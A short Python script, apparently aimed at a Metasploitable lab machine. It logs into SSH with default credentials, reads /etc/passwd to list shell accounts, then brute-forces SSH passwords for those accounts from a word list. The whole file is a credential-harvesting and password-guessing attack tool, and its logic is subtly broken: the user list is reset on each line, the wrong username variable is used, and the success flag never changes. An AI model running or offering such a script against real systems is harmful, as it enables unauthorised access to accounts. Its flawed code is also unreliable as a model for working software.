import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = '10.0.2.15'
port = 22
username = 'msfadmin'
password = 'msfadmin'

ssh.connect(ip, port = port, username = username, password = password);
command = 'cat /etc/passwd'

stdin,stdout,stderr = ssh.exec_command(command)

cmd_output = stdout.read()
ssh.close()

print(cmd_output)

etcpasswd = cmd_output.decode().split("\n")

for ep in etcpasswd:
	user_list = []
	if "/bin/bash" in ep or "/bin/sh" in ep:
		user = ep.split(":")[0]
		print(user)
		user_list.append(user)
print(user_list)

f = open("password-list.txt", "r")

def trySsh(user, password):	
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	success = False
	try:
		ssh.connect(ip, username = username, password = password.strip(), timeout = 0.1, banner_timeout = 0.1)
		print("Connected ... Username : ",user ," Password : ",password.strip())
	except Exception as e:
		pass	
	finally:
		ssh.close()	
		return success
			
for user in user_list:
	if(trySsh(user,user)):
		print("Connected ... Username : ",user," Password : ",user)
	else:
		for password in f:
			if(trySsh(user,password)):
				print(f"Connected ... Username : {user}, Password : {password.strip()}")
